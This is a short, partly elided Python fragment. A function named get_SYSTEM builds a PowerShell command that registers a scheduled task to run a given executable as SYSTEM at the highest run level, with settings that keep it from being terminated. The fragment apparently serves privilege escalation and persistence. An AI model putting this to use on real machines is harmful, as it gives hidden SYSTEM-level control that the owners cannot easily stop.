...
def get_SYSTEM():
    ...
    c = (
        f'$t = New-ScheduledTaskAction -Execute "{exe}" -Argument "{arg}"; '
         ...
         '$e = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries '
         '-StartWhenAvailable -DisallowDemandStart:$false -Priority 3; '
         '$e.AllowHardTerminate = $false; '
        
        f'$p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Service -RunLevel Highest; '
        f'Register-ScheduledTask -TaskName "{task}" -Action $t -Settings $e -Principal $p -Force; '
